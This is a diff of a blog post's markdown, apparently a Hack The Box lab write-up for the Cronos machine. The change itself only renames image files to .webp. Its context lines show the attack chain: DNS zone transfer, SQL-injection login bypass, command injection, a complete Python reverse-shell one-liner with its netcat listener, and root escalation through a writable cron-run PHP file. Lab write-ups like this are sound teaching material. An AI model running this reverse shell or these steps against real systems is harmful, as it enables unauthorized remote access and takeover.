@@ -5,11 +5,11 @@ summary: This is the summary for an awesome post.
 tags: hackthebox, writeup
 
 ## Overview
-![writeup.metadata.infocard](/static/files/posts_htb_cronos/infocard.png)
+![writeup.metadata.infocard](/static/files/posts_htb_cronos/infocard.png.webp)
 
 This is a writeup for HTB VM [Cronos](https://www.hackthebox.eu/home/machines/profile/11). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_htb_cronos/killchain.png)
+![writeup.overview.killchain](/static/files/posts_htb_cronos/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -50,13 +50,13 @@ dig +noall +answer -x 10.10.10.13 @10.10.10.13
 host -t axfr cronos.htb 10.10.10.13
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_htb_cronos/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_htb_cronos/screenshot01.png.webp)  
 
-![writeup.enumeration.steps.2.2](/static/files/posts_htb_cronos/screenshot02.png)  
+![writeup.enumeration.steps.2.2](/static/files/posts_htb_cronos/screenshot02.png.webp)  
 
 3\. Upon visiting the `admin.cronos.htb` subdomain, we are presented with a login page, that is vulnerable to SQL injection:  
 
-![writeup.enumeration.steps.3.1](/static/files/posts_htb_cronos/screenshot03.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_htb_cronos/screenshot03.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -69,7 +69,7 @@ host -t axfr cronos.htb 10.10.10.13
 ## Phase #2: Exploitation
 1\. We use SQLi to successfully bypass login and are presented with a page that allows running the `ping` and `traceroute` commands. The input field on this page is vulnerable to a command injection:  
 
-![writeup.exploitation.steps.1.1](/static/files/posts_htb_cronos/screenshot04.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_htb_cronos/screenshot04.png.webp)  
 
 2\. We use this to execute a Python reverse shell and get interactive access on the target system:  
 ```
@@ -77,13 +77,13 @@ nc -nlvp 443
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_htb_cronos/screenshot05.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_htb_cronos/screenshot05.png.webp)  
 
-![writeup.exploitation.steps.2.2](/static/files/posts_htb_cronos/screenshot06.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_htb_cronos/screenshot06.png.webp)  
 
 3\. We obtain the first flag since the file is readable by current user `www-data`:  
 
-![writeup.exploitation.steps.3.1](/static/files/posts_htb_cronos/screenshot07.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_htb_cronos/screenshot07.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -112,25 +112,25 @@ noulis
 ## Phase #3: Privilege Escalation
 1\. While enumerating, we find hardcoded MySQL credentials for user `admin` within the `/var/www/admin/config.php` file. We use these credentials to connect to MySQL service and obtain password hash for user `admin`. We were unable to crack this hash:  
 
-![writeup.privesc.steps.1.1](/static/files/posts_htb_cronos/screenshot08.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_htb_cronos/screenshot08.png.webp)  
 
-![writeup.privesc.steps.1.2](/static/files/posts_htb_cronos/screenshot09.png)  
+![writeup.privesc.steps.1.2](/static/files/posts_htb_cronos/screenshot09.png.webp)  
 
 2\. Upon further enumeration, we find that there's a cronjob that run a PHP file every minute with `root` privileges. Luckily for us, the PHP file it runs is owned by current user `www-data`:  
 
-![writeup.privesc.steps.2.1](/static/files/posts_htb_cronos/screenshot10.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_htb_cronos/screenshot10.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_htb_cronos/screenshot11.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_htb_cronos/screenshot11.png.webp)  
 
 3\. We can replace this file with a PHP reverse shell and catch the incoming shell to obtain elevated privileges:  
 
-![writeup.privesc.steps.3.1](/static/files/posts_htb_cronos/screenshot12.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_htb_cronos/screenshot12.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_htb_cronos/screenshot13.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_htb_cronos/screenshot13.png.webp)  
 
 4\. We then view the contents of the `root.txt` file to complete the challenge:  
 
-![writeup.privesc.steps.4.1](/static/files/posts_htb_cronos/screenshot14.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_htb_cronos/screenshot14.png.webp)  
 
 ## Loot
 ### Hashes
